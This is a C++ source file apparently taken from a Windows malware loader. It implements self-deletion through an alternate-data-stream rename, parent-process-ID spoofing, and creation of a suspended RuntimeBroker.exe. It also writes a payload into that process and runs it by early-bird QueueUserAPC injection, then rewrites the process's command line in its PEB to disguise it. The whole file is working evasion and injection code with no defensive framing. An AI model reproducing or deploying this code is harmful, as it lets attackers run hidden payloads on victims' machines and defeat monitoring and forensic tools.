#include "../include/Injection.hpp"



bool DataStreamExploitDeleteFile(const wchar_t* FilePath) {

	FILE_DISPOSITION_INFO FileDisposition = { 0 };
	PFILE_RENAME_INFO pFileRenameInfo = nullptr;
	HANDLE hFile = nullptr;


	const wchar_t* NewStream = L":Random";
	size_t StreamLen = wcslen(NewStream) * sizeof(wchar_t);


	//
	// Allocate buffer for FILE_RENAME_INFO struct.
	//

	pFileRenameInfo = static_cast<PFILE_RENAME_INFO>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(FILE_RENAME_INFO) + StreamLen
	));

	if (!pFileRenameInfo)
		return false;


	//
	// Reopen file
	//

	hFile = CreateFileW(
		FilePath,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		WIN32_ERR(CreateFileW);
		return false;
	}


	//
	// Delete file contents
	//

	pFileRenameInfo->FileNameLength = StreamLen;
	memcpy(pFileRenameInfo->FileName, NewStream, StreamLen);

	if (!SetFileInformationByHandle(
		hFile,
		FileRenameInfo,
		pFileRenameInfo,
		sizeof(FILE_RENAME_INFO) + StreamLen)) {

		WIN32_ERR(SetFileInformationByHandle);
		return false;
	}


	CloseHandle(hFile);
	if (!DeleteFileW(FilePath)) {
		WIN32_ERR(DeleteFileW);
		return false;
	}

	return true;
}




PPROC_THREAD_ATTRIBUTE_LIST SpoofPPID(HANDLE ParentProcess) {

	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = nullptr;
	size_t ListSize = 0;


	InitializeProcThreadAttributeList(nullptr, 1, 0, &ListSize);

	pAttributeList = static_cast<PPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		ListSize
	));

	if (!pAttributeList)
		return nullptr;

	
	if (!InitializeProcThreadAttributeList(
		pAttributeList,
		1,
		0,
		&ListSize)) {

		WIN32_ERR(InitializeProcThreadAttributeList);
		return nullptr;
	}


	if (!UpdateProcThreadAttribute(
		pAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&ParentProcess,
		sizeof(HANDLE),
		nullptr,
		nullptr)) {

		WIN32_ERR(UpdateProcThreadAttribute);
		return nullptr;
	}

	return pAttributeList;
}



std::tuple<HANDLE, HANDLE, std::uint32_t> CreateSuspendedProcess(const wchar_t* FilePath, _In_opt_ HANDLE Parent) {

	PROCESS_INFORMATION         ProcessInfo = { 0 };
	STARTUPINFOW                StartupInfo = { 0 };
	STARTUPINFOEXW              StartupInfoEx = { 0 };
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = nullptr;
	
	wchar_t WindowsDirectory[MAX_PATH] = { 0 };
	wchar_t CommandLine[MAX_PATH] = { 0 };

	StartupInfo.cb = sizeof(STARTUPINFOW);
	StartupInfoEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);


	if (Parent != nullptr) {

		pAttributeList = SpoofPPID(Parent);
		if (pAttributeList == nullptr)
			return std::make_tuple(nullptr, nullptr, 0);

		StartupInfoEx.lpAttributeList = pAttributeList;
	}



	//
	// Retrieve windows directory
	//

	if (!GetWindowsDirectoryW(WindowsDirectory, MAX_PATH)) {
		WIN32_ERR(GetWindowsDirectoryW);
		return std::make_tuple(nullptr, nullptr, 0);
	}



	//
	// Note: Microsoft specifies writeable memory must be used for lpCommandLine.
	// It would PROBABLY still be okay if I used the original string, but I'm not risking it.
	//

	lstrcpyW(CommandLine, FilePath); 

	std::wstring CurrentDirectory = WindowsDirectory;
	std::wstring ApplicationName = WindowsDirectory;

	if (!CreateProcessW(
		(ApplicationName + L"\\System32\\RuntimeBroker.exe").c_str(),
		CommandLine,
		nullptr,
		nullptr,
		FALSE,
		(Parent == nullptr ? CREATE_SUSPENDED : (CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT)),
		nullptr,
		(CurrentDirectory + L"\\System32").c_str(),
		(Parent == nullptr ? &StartupInfo : &StartupInfoEx.StartupInfo),
		&ProcessInfo)) {

		WIN32_ERR(CreateProcessW);
		return std::make_tuple(nullptr, nullptr, 0);
	}

	return std::make_tuple(ProcessInfo.hProcess, ProcessInfo.hThread, ProcessInfo.dwProcessId);
}



byte* RetrieveImageBase(HANDLE hProcess) {

	fnNtQueryInformationProcess pQueryProcess = nullptr;
	PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
	PPEB pPeb = nullptr;
	byte* BaseOfImage = nullptr;
	size_t BytesRead = 0;

	NTSTATUS Status = ERROR_SUCCESS;


	std::cout << "[+] Retrieving image base address of child process..." << std::endl;
	pQueryProcess = reinterpret_cast<fnNtQueryInformationProcess>\
		(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

	if (pQueryProcess == nullptr)
		return nullptr;


	auto CheckStateFreeBuffer = [&](bool State) {
		if (pPeb != nullptr) {
			HeapFree(GetProcessHeap(), 0, pPeb);
		}
		return (State ? BaseOfImage : nullptr);
	};



	//
	// Allocate buffer for PEB.
	//

	pPeb = static_cast<PPEB>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(PEB)
	));

	if (pPeb == nullptr)
		return CheckStateFreeBuffer(false);



	//
	// Get process PEB.
	//

	Status = pQueryProcess(
		hProcess,
		ProcessBasicInformation,
		&ProcessBasicInfo,
		sizeof(ProcessBasicInfo),
		nullptr
	);

	if (Status != ERROR_SUCCESS) {
		NTAPI_ERR(NtQueryInformationProcess, Status);
		return CheckStateFreeBuffer(false);
	}

	
	if (!ReadProcessMemory(
		hProcess,
		ProcessBasicInfo.PebBaseAddress,
		pPeb,
		sizeof(PEB),
		&BytesRead
	) || BytesRead != sizeof(PEB)) {

		WIN32_ERR(ReadProcessMemory);
		return CheckStateFreeBuffer(false);
	}


	BaseOfImage = (byte*)(pPeb->ImageBaseAddress);
	return CheckStateFreeBuffer(true);
}



bool CopyPayloadIntoProcess(HANDLE hProcess, void* RemoteAddress, void* PayloadPtr, size_t PayloadSize) {

	size_t BytesWritten = 0;
	if (!WriteProcessMemory(
		hProcess,
		RemoteAddress,
		PayloadPtr,
		PayloadSize,
		&BytesWritten
	) || BytesWritten != PayloadSize) {

		WIN32_ERR(WriteProcessMemory);
		std::cerr << "\t-Payload Size: " << PayloadSize << std::endl <<
			"\t-Bytes Written: " << BytesWritten << std::endl;

		return false;
	}

	std::cout << "[+] Wrote payload into process at: 0x" << RemoteAddress << std::endl;
	return true;
}



bool QueueUserApcRunPayload(HANDLE hThread, void* RemoteAddress) {

	if (!QueueUserAPC(
		static_cast<PAPCFUNC>(RemoteAddress),
		hThread,
		0x00)) {

		WIN32_ERR(QueueUserApc);
		return false;
	}

	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	return true;
}


bool SpoofCommandLine(const wchar_t* NewCommandLine, HANDLE hProcess) {

	fnNtQueryInformationProcess pQueryProcess = nullptr;
	PROCESS_BASIC_INFORMATION PBI = { 0 };
	PDOCUMENTED_PEB pPeb = nullptr;
	PRTL_USER_PROCESS_PARAMETERS pParams = nullptr;
	size_t ReturnLength = 0;
	NTSTATUS Status = ERROR_SUCCESS;



	auto CheckStateFreeBuffers = [&](bool State) {
		if (pPeb != nullptr)
			HeapFree(GetProcessHeap(), 0, pPeb);

		if (pParams != nullptr)
			HeapFree(GetProcessHeap(), 0, pParams);

		return State;
	};


	pQueryProcess = reinterpret_cast<fnNtQueryInformationProcess>\
		(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

	if (!pQueryProcess)
		return false;


	std::cout << "[+] Spoofing command line arguments..." << std::endl;

	//
	// Copy PEB
	//

	Status = pQueryProcess(
		hProcess,
		ProcessBasicInformation,
		&PBI,
		sizeof(PBI),
		nullptr
	);

	if (Status != ERROR_SUCCESS) {
		NTAPI_ERR(NtQueryInformationProcess, Status);
		return CheckStateFreeBuffers(false);
	}


	pPeb = static_cast<PDOCUMENTED_PEB>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(DOCUMENTED_PEB)
	));

	if (pPeb == nullptr)
		return CheckStateFreeBuffers(false);


	if (!ReadProcessMemory(
		hProcess,
		PBI.PebBaseAddress,
		pPeb,
		sizeof(DOCUMENTED_PEB),
		&ReturnLength
	) || ReturnLength != sizeof(DOCUMENTED_PEB)) {

		WIN32_ERR(ReadProcessMemory(1));
		return CheckStateFreeBuffers(false);
	}



	//
	// Copy RTL_USER_PROCESS_PARAMETERS
	//

	pParams = static_cast<PRTL_USER_PROCESS_PARAMETERS>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF
	));

	if (pParams == nullptr)
		return CheckStateFreeBuffers(false);


	if (!ReadProcessMemory(
		hProcess,
		pPeb->ProcessParameters,
		pParams,
		sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
		nullptr ) && GetLastError() != ERROR_PARTIAL_COPY) {

		WIN32_ERR(ReadProcessMemory(2));
		return CheckStateFreeBuffers(false);
	}


	
	//
	// Alter CommandLine Buffer
	//

	std::uint16_t NewLength = (lstrlenW(NewCommandLine) + 1) * sizeof(wchar_t);

	if (!WriteProcessMemory(
		hProcess,
		pParams->CommandLine.Buffer,
		NewCommandLine,
		NewLength,
		nullptr )) {

		WIN32_ERR(WriteProcessMemory(1));
		return CheckStateFreeBuffers(false);
	}



	//
	// We need to change the CommandLine length & MaximumLength too.
	//

	auto pRemoteParams = pPeb->ProcessParameters;
	
	if (!WriteProcessMemory(
		hProcess,
		&pRemoteParams->CommandLine.Length,
		(PVOID)&NewLength,
		sizeof(std::uint16_t),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory(1));
		return CheckStateFreeBuffers(false);
	}

	if (!WriteProcessMemory(
		hProcess,
		&pRemoteParams->CommandLine.MaximumLength,
		(PVOID)&NewLength,
		sizeof(std::uint16_t),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory(1));
		return CheckStateFreeBuffers(false);
	}

	std::wcout << L"[+] Successfully spoofed command line args to: " << NewCommandLine << std::endl;
	return CheckStateFreeBuffers(true);
}